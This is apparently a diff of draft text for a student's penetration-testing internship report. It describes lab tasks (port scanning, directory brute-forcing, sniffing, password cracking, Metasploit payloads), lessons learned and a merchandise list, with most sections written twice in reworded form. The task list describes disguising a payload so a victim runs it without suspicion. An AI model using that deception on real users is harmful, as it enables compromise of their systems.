+3. To understand the tasks properly and take the appropriate actions and expected execution for the exploitation of the tasks.
+4. To gain hand-on experience on the organizational level tools which can be used for the penetration testing in the professional environment.
+5. To understand to security risks which are occurs in commmon vulnerabilities in the modern environment and web applications.
+
+As per the requirement of the performing the tasks, below are the key factors of tasks and responsibilites which needs to take care:
+1. Ports Analysis: Performed a detailed scan to find out all the open ports and possible active vulnerabilities on a target website as per running active running version of the service running on the port.
+2. Directory Enumeration: Execution of the burte-force attack on a target website using numeruous pre-built tools like dirb, dirbuster and gobuster.
+3. Network Packet Sniffing: Interception of network traffic to understand, modify and read details of the packets in the plain text using different tools like Wireshark, tcpdump & Packet Monitor (Pktmon).
+4. Cryptographic Analysis: Deep understanding of encryption and decryption techniques to crack the password of any encrypted file under various tools & softwares using different tools and website portals. 
+5. Payload Creation: To create a payload which can be used to exploit the target system using different tools like msfvenom, msfconsole & Metasploit which can help an attacker to perform things which are not supposed to happen.
+6. Execution of Payload: Post step of creation of payload, it is important to send that payload in efficient manner so the victim will not be able to identify it and make the payload so legitimate that the victim user will execute the payload without any doubt and hesitation.
+7. Vulnerability Analysis & Penetration Testing: Under the exploitaiton of Simulation room, an entire process of VAPT comes to the picture which includes all the steps which are mentioned above under this section. Along with this, it is expected to perform Capture The Flag (CTF) task to get the final flag to complete the task. This includes, port scanning, directory enumeration, brute-force on usernames and passwords, accessing the target server machine using different open services like SSH, and finally capturin the final flag using tools like hydra, john the ripper, etc. 
+
+
+According to the requirements for completing the tasks, the following are the primary components of the tasks and responsibilities that must be considered:
+1. Ports Analysis: Using an active version of the service running on the port, a full scan was conducted to identify all open ports and potential active vulnerabilities on a target website.
+2. Directory Enumeration: Using several pre-built tools, such as dirb, dirbuster, and gobuster, to launch a brute-force attack on a target website.
+3. Network Packet Sniffing: Using tools such as Wireshark, tcpdump, and Packet Monitor (Pktmon), network traffic can be intercepted in order to understand, alter, and read packet details in plain text which may include usernames, passwords, cookies, etc.
+4. Cryptographic Analysis: In-depth knowledge of encryption and decryption methods, such as hashing, to crack the password of any encrypted file using a variety of software programs and tools and online portals.
+5. Payload Creation: To create a payload that can be used to exploit the target system using various tools such as Metasploit, msfvenom, and msfconsole, which can assist an attacker in performing actions that are unethical to perform.
+6. Payload Execution: After the payload has been created, it is crucial to send it smoothly so the victim won't recognize it as a payload. The attacker should also make the payload seem so genuine that the victim user will execute it without hesitation or doubt.
+7. Vulnerability Analysis & Penetration Testing: All of the steps listed above in this section are part of the full VAPT process, which is brought to light under the simulation room exploit. To obtain the last flag and finish the task, it is also expected to perform the Capture the Flag (CTF) task. Port scanning, directory enumeration, brute-forcing usernames and passwords, using various open services, such as SSH, to gain access to the target server machine, and finally capturing the last flag with tools like Hydra, John the Ripper, etc. are all included in this.
+
+
+1. Understanding on the pre-built tools: While understanding and exploiting the tasks as per the list, I gone through numerous articles, web pages and workings of different tools and technologies which I was not aware about. Using this, I was able to perform and successfully complete the tasks efficiently. 
+2. Understanding of Simulation Rooms: To perform the Hard Level tasks, I was expected to work on TryHackMe Platform's Simulation Room. This room gave me an platform to understand real life scenarios in a test room where I can make mistake, understand it and correct it before trying any wrong command or execute a payload on a real target or in real-life incident.
+3. Understanding of Incident Life-Cycle: I developed a comprehensive understanding of the steps involved in securing systems, from initial vulnerability assessment to implementing mitigations.
+4. Problem Solving Ability: While working on the explotation of tasks, I stuck at initial steps in almost every task. This includes, how can I begin with the task or how can I acheive this task or what tools I can use to mark any task as completed. This helped me to understand my weakness and helped me to overcome from it by handling critical scenarios in very efficient manner especially when completion date it near. 
+5. Technical Report Writing: After successfully exploiting and completing all the tasks, while working on the report, I understand what difficulties I can face in the technical report writing and what measure I need to follow and what mistakes I need to take care further while working on the creation of technical report. 
+
+1. Having an understanding of the pre-built tools: I read plenty of articles, websites, and examples on how various tools and technologies run in order to better understand and take advantage of the tasks on the list. I was able to carry out and successfully finish the tasks effectively by using this. 
+2. Knowledge of Simulation Rooms: I was supposed to work on the TryHackMe Platform's Simulation Room in order to complete the Hard Level tasks. Before attempting any incorrect commands or executing a payload on a real target or in a real-life incident, this room provided me with a platform to comprehend real-life scenarios in a test room where I can make mistakes, understand them, and solve them.
+3. Awareness of Incident Life Cycle: I gained an in-depth knowledge of the processes that go into securing systems, from identifying vulnerabilities to implementing remedies in place.
+4. Ability to Solve Problems: In practically every task I worked on for task exploitation, I ran into trouble at the beginning. This covers how I can start the task, how I can finish it, and what resources I can use to mark any task as finished. I was able to identify my weakness and overcome it by managing crucial situations effectively, particularly when the deadline was approaching.
+5. Technical Report Writing: After effectively utilizing and finishing every task, I am now aware of the challenges I may encounter when writing technical reports, as well as the steps I must take and the errors I must continue to avoid while performing it.
+
+
+
+1. Use of multiple VM's at a time: Before starting with the execution of the tasks, I had no experience of handling multiple VM's simultaneously. Due to this, I faceed a little confusion while switching back the working VM. But, I as I kept doing the exploitaiton of the given tasks, I managed myself to get used to the handling of multiple OS VM's simultaneously without any difficulty. I was successfully able to overcome this challange with the time passed.
+2. Use of Simulation Room for the first time: I had no experience of using simulation room ever before, especially configuration for the connecting simulation room to the internet using different options like OpenVPN. Due to the necessisity of the task, I overcome and learned new things which can help me in my career ahead with configuring internet connections not only for simulation rooms, but also for VM's which I might create as per the requirement of the task in future.
+3. Understanding of multiple tools and technologies: While understanding and exploiting the tasks as per the list, I had to go through numerous articles, web pages and workings of different tools and technologies for the completion of the tasks which I was not aware about. This includes, list of tools which I need to use for the respective task, what is the expected behavior of the tool using command or GUI, what is the syntax of the tool, etc. Using this, I was able to perform and successfully complete the tasks efficiently. 
+4. Creation of Detailed Technical Report: As I was creating a technical report for the first time, I was not sure about the metadata and what content I am expected to write in it. This platform gave me an opportunity to understand, learn and create a detailed technical report about the Vulnerability assessment, network assessment, and all other things which are expected from a Penetration tester in a real world. Due to this, I was able to successfully create a detailed report on a Pentest which I have performed. 
+
+1. Using multiple virtual machines (VMs) at once: Just before beginning the tasks, I had no prior experience managing multiple VMs at once. As a result, I had some trouble returning to the working virtual machine. However, as I continued to take advantage of the tasks assigned, I was able to become familiar to managing several OS virtual machines at once without any problems. With the help of time, I was able to successfully overcome this challenge.
+2. Using the Simulation Room for the First Time: I had never used a simulation room before, particularly when it came to setting it up to connect to the internet using various tools like OpenVPN. I overcame the task's necessity and gained new knowledge that will help me in my future career by enabling me to configure internet connections for both simulation rooms and virtual machines (VMs), which I could create in the future based on the task's requirements.
+3. Knowledge of various tools and technologies: In order to complete the tasks on the list, I had to read through a lot of articles, websites, and the inner workings of various tools and technologies that I was unaware of. This includes a list of the tools I must use for each task, information about the tool's syntax, expected behavior when using a command or graphical user interface, etc. I was able to carry out and successfully finish the tasks effectively by using this.
+4. Creation of Detailed Technical Report: Since this was my first time writing a technical report, I was unsure of the metadata and the type of content I should include. I was able to understand, gain knowledge, and produce a complete technical report about the vulnerability assessment, network assessment, and everything else that a real-world penetration tester would be expected to do because of this platform. As a result, I was able to successfully produce an in-depth report on an attack I conducted  in a lab. 
+
+1. Customized MousePad with either associates photo or ShadowFox logo
+2. Customized Bottle with ShadowFox name and logo
+3. Customized Diary with ShadowFox name and logo
+4. Customized Hoodie with ShadowFox name and logo
+5. Customized Mug with ShadowFox name and logo
+6. Customized Clock with ShadowFox name and logo
+7. Customized BagPack with ShadowFox name and logo
+
+
